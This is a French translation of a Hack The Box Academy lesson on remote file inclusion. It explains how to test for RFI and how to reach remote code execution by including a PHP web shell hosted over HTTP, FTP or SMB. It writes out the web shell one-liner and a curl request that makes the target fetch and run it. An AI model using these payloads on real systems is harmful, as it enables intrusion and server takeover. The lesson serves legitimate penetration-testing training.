Inclusion de fichiers à distance (RFI)
===========================

Jusqu'à présent, dans ce module, nous nous sommes principalement concentrés sur `l'inclusion de fichiers locaux (LFI)`. Cependant, dans certains cas, nous pouvons également inclure des fichiers distants "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing /07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", si la fonction vulnérable permet l'inclusion d'URL distantes. Cela permet deux avantages principaux :

1. Énumération des ports locaux uniquement et des applications Web (c'est-à-dire SSRF)
2. Obtenir l'exécution de code à distance en incluant un script malveillant que nous hébergeons

Dans cette section, nous expliquerons comment obtenir l'exécution de code à distance grâce aux vulnérabilités RFI. Le module [Attaques côté serveur](https://academy.hackthebox.com/module/details/145) couvre diverses techniques `SSRF` , qui peuvent également être utilisées avec des vulnérabilités RFI.

Inclusion de fichiers locaux ou distants
-------------------------------

Lorsqu'une fonction vulnérable nous permet d'inclure des fichiers distants, nous pouvons héberger un script malveillant, puis l'inclure dans la page vulnérable pour exécuter des fonctions malveillantes et obtenir l'exécution de code à distance. Si nous nous référons au tableau de la première section, nous voyons que voici quelques-unes des fonctions qui (si elles sont vulnérables) autoriseraient RFI :

| Fonction | Lire le contenu | Exécuter | URL distante |
| --- | :-: | :-: | :-: |
| PHP | | | |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| Java | | | |
| `importer` | ✅ | ✅ | ✅ |
| .NET | | | |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `inclure` | ✅ | ✅ | ✅ |

Comme nous pouvons le voir, presque toutes les vulnérabilités RFI sont également des vulnérabilités LFI, car toute fonction qui permet d'inclure des URL distantes permet généralement d'inclure des URL locales. Cependant, une LFI n'est pas nécessairement une RFI. Ceci est principalement dû à trois raisons :

1. La fonction vulnérable peut ne pas autoriser l'inclusion d'URL distantes
2. Vous ne pouvez contrôler qu'une partie du nom de fichier et non l'intégralité de l'encapsuleur de protocole (par exemple : `http://`, `ftp://`, `https://`).
3. La configuration peut empêcher complètement RFI, car la plupart des serveurs Web modernes désactivent l'inclusion de fichiers distants par défaut.

De plus, comme nous pouvons le noter dans le tableau ci-dessus, certaines fonctions permettent d'inclure des URL distantes mais ne permettent pas l'exécution de code. Dans ce cas, nous serions toujours en mesure d'exploiter la vulnérabilité pour énumérer les ports locaux et les applications Web via SSRF.

Vérifier RFI
----------

Dans la plupart des langues, l'inclusion d'URL distantes est considérée comme une pratique dangereuse car elle peut permettre de telles vulnérabilités. C'est pourquoi l'inclusion d'URL distante est généralement désactivée par défaut. Par exemple, toute inclusion d'URL distante dans PHP nécessiterait l'activation du paramètre `allow_url_include`. Nous pouvons vérifier si ce paramètre est activé via LFI, comme nous l'avons fait dans la section précédente :

```
dsgsec@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64-d | grep allow_url_include

allow_url_include=Activé

```

Cependant, cela peut ne pas toujours être fiable, car même si ce paramètre est activé, la fonction vulnérable peut ne pas autoriser l'inclusion d'URL distante pour commencer. Ainsi, un moyen plus fiable de déterminer si une vulnérabilité LFI est également vulnérable aux RFI consiste à "essayer d'inclure une URL" et de voir si nous pouvons obtenir son contenu. Au début, `nous devrions toujours commencer par essayer d'inclure une URL locale` pour nous assurer que notre tentative ne sera pas bloquée par un pare-feu ou d'autres mesures de sécurité. Alors, utilisons (`http://127.0.0.1:80/index.php`) comme chaîne d'entrée et voyons si elle est incluse :

![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

Comme nous pouvons le voir, la page `index.php` a été incluse dans la section vulnérable (c'est-à-dire la description de l'historique), de sorte que la page est en effet vulnérable aux RFI, car nous pouvons inclure des URL. De plus, la page `index.php` n'a pas été incluse en tant que texte de code source, mais a été exécutée et rendue en tant que PHP, de sorte que la fonction vulnérable permet également l'exécution de PHP, ce qui peut nous permettre d'exécuter du code si nous incluons un script PHP malveillant que nous hôte sur notre machine.

Nous constatons également que nous avons pu spécifier le port `80` et obtenir l'application Web sur ce port. Si le serveur principal héberge d'autres applications Web locales (par exemple, le port `8080`), nous pourrons peut-être y accéder via la vulnérabilité RFI en y appliquant des techniques SSRF.

Remarque : Il n'est peut-être pas idéal d'inclure la page vulnérable elle-même (c'est-à-dire index.php), car cela peut provoquer une boucle d'inclusion récursive et provoquer un DoS sur le serveur principal.

Exécution de code à distance avec RFI
------------------------------

La première étape pour obtenir l'exécution de code à distance consiste à créer un script malveillant dans le langage de l'application Web, PHP dans ce cas. Nous pouvons utiliser un shell Web personnalisé que nous téléchargeons sur Internet, utiliser un script shell inversé ou écrire notre propre shell Web de base comme nous l'avons fait dans la section précédente, ce que nous ferons dans ce cas :

```
dsgsec@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

```

Maintenant, tout ce que nous avons à faire est d'héberger ce script et de l'inclure via la vulnérabilité RFI. C'est une bonne idée d'écouter sur un port HTTP commun comme `80` ou `443`, car ces ports peuvent être ajoutés à la liste blanche au cas où l'application Web vulnérable dispose d'un pare-feu empêchant les connexions sortantes. De plus, nous pouvons héberger le script via un service FTP ou un service SMB, comme nous le verrons ensuite.

HTTP
----

Maintenant, nous pouvons démarrer un serveur sur notre machine avec un serveur python de base avec la commande suivante, comme suit :

```
dsgsec@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Servir HTTP sur le port 0.0.0.0 <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

```

Maintenant, nous pouvons inclure notre shell local via RFI, comme nous l'avons fait précédemment, mais en utilisant `<OUR_IP>` et notre `<LISTENING_PORT>`. Nous spécifierons également la commande à exécuter avec `&cmd=id` :

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Comme nous pouvons le voir, nous avons obtenu une connexion sur notre serveur python, et le shell distant a été inclus, et nous avons exécuté la commande spécifiée :

```
dsgsec@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Servir HTTP sur le port 0.0.0.0 <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

IP_SERVEUR - - [SNIP] "GET /shell.php HTTP/1.0" 200 -

```

Conseil : Nous pouvons examiner la connexion sur notre ordinateur pour nous assurer que la demande est envoyée comme nous l'avons spécifié. Par exemple, si nous avons vu qu'une extension supplémentaire (.php) a été ajoutée à la requête, nous pouvons l'omettre de notre charge utile

FTP
---

Comme mentionné précédemment, nous pouvons également héberger notre script via le protocole FTP. Nous pouvons démarrer un serveur FTP de base avec `pyftpdlib` de Python, comme suit :

```
dsgsec@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> démarrage du serveur FTP sur 0.0.0.0:21, pid=23686 <<<
Modèle de concurrence [SNIP] : asynchrone
[SNIP] adresse de mascarade (NAT) : aucune
Ports passifs [SNIP] : aucun

```

Cela peut également être utile si les ports http sont bloqués par un pare-feu ou si la chaîne `http://` est bloquée par un WAF. Pour inclure notre script, nous pouvons répéter ce que nous avons fait précédemment, mais en utilisant le schéma `ftp://` dans l'URL, comme suit :

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Comme nous pouvons le voir, cela a fonctionné de manière très similaire à notre attaque http et la commande a été exécutée. Par défaut, PHP essaie de s'authentifier en tant qu'utilisateur anonyme. Si le serveur requiert une authentification valide, les informations d'identification peuvent être spécifiées dans l'URL, comme suit :

```
dsgsec@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...COUPER...
uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

PME
---

Si l'application Web vulnérable est hébergée sur un serveur Windows (ce que nous pouvons dire à partir de la version du serveur dans les en-têtes de réponse HTTP), nous n'avons pas besoin que le paramètre `allow_url_include` soit activé pour l'exploitation RFI, car nous pouvons utiliser le SMB protocole pour l'inclusion de fichiers distants. En effet, Windows traite les fichiers sur les serveurs SMB distants comme des fichiers normaux, qui peuvent être référencés directement avec un chemin UNC.

Nous pouvons créer un serveur SMB à l'aide de `Impacket's smbserver.py`, qui autorise l'authentification anonyme par défaut, comme suit :

```
dsgsec@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Fichier de configuration analysé
[*] Rappel ajouté pour UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Rappel ajouté pour UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Fichier de configuration analysé
[*] Fichier de configuration analysé
[*] Fichier de configuration analysé

```

Maintenant, nous pouvons inclure notre script en utilisant un chemin UNC (par exemple `\\<OUR_IP>\shell.php`) et spécifier la commande avec (`&cmd=whoami`) comme nous l'avons fait précédemment :

![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

Comme nous pouvons le voir, cette attaque fonctionne en incluant notre script distant, et nous n'avons pas besoin d'activer des paramètres autres que ceux par défaut. Cependant, nous devons noter que cette technique est "plus susceptible de fonctionner si nous étions sur le même réseau", car l'accès aux serveurs SMB distants via Internet peut être désactivé par défaut, selon les configurations de serveur Windows.